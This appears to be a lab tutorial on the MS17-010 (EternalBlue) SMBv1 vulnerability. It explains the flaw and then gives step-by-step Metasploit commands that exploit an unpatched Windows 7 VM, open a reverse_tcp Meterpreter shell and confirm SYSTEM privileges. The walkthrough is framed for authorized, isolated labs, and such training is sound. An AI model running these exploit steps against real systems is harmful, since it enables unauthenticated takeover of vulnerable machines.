


## Intro  
**MS17-010 (CVE-2017-0144)**, also known as **EternalBlue**, is a critical remote code execution vulnerability in Microsoftâ€™s **Server Message Block version 1 (SMBv1)** protocol. It allows an unauthenticated attacker to take full control of a vulnerable Windows systemâ€”**without user interaction**.

## ğŸ” What Is SMB?

**Server Message Block (SMB)** is a network file-sharing protocol used by Windows for sharing files, printers, and other resources over a network.  
- SMBv1 is the legacy version (enabled by default on older Windows like Windows 7).  
- SMB typically uses **TCP port 445**.

## How It Works  
The vulnerability stems from **improper handling of malformed SMB packets**, leading to a **buffer overflow** in the SMBv1 server (`srv.sys`).  
An attacker can send specially crafted packets to execute arbitrary code in **kernel mode**â€”gaining **NT AUTHORITY\SYSTEM** privileges remotely and silently.

**Why itâ€™s dangerous**:  
- **Unauthenticated**: No credentials needed.  
- **Wormable**: Self-propagating (used in **WannaCry** and **NotPetya** ransomware).  
- **Critical impact**: Full system compromise.



## To perform SMBv1 exploitation using MS17-010 (EternalBlue) on your Windows 7 VM (`192.168.56.103`) from Kali Linux (`192.168.56.106`), follow this step-by-step

### Prerequisites

#### Target:
- **Windows 7 SP1 (unpatched)** â€” must **not** have the March 2017 security update (MS17-010 patch)
- **SMBv1 enabled** (enabled by default on Win7)
- Confirm SMB is listening and vulnerable:
  ```bash
  nmap -p 445 --script smb-vuln-ms17-010 192.168.56.103
  ```

#### Attacker:
- **Kali Linux** (`192.168.56.106`)
- Both VMs on the **same network** (e.g., **Host-only** or **Bridged** in VirtualBox)

> ğŸ’¡ Ensure Windows Firewall allows inbound on port 445, or disable it temporarily in the lab.

---

### 1. Open Metasploit Console
```bash
msfconsole
```

### 2. Select the Exploit
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### 3. Set Target Options
```bash
set RHOSTS 192.168.56.103
set RPORT 445
```

> To confirm architecture (optional):  
> ```bash
> show targets
> ```
> - For **Windows 7 SP1 x64**, **Target 0 (Automatic)** usually works.  
> - If needed, manually set: `set TARGET 0`

### 4. Choose a Payload
```bash
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.106   # Your Kali IP
set LPORT 4446             # Use a NEW unused port (e.g., not 4444, 4555, etc.)
```

> âš ï¸ **Important**: Use a fresh `LPORT` to avoid conflicts with other active handlers.

### (Optional) Tune Exploit Stability
EternalBlue can be unstable or crash the target. Improve reliability:
```bash
set VERBOSE true
```

> Note: No credentials are needed â€” this exploit is **fully unauthenticated**.

### 5. Run the Exploit
```bash
exploit
```

> â³ Wait 10â€“60 seconds. The exploit may take a few attempts.  
> âš ï¸ **Risk**: May cause a **blue screen (BSOD)** on some systems â€” normal in unpatched Win7 lab VMs.

### 6. Verify Success

If successful, youâ€™ll get a **Meterpreter session**:
```meterpreter
sysinfo
```

Check your privileges:
```meterpreter
getuid
```

âœ… Expected output:
```
Server username: NT AUTHORITY\SYSTEM
```

You now have **full administrative control** over the target machine.

---

> ğŸ” **Ethical Reminder**: EternalBlue is a high-risk exploit. Use **only** in authorized, isolated lab environments for educational or defensive security purposes.

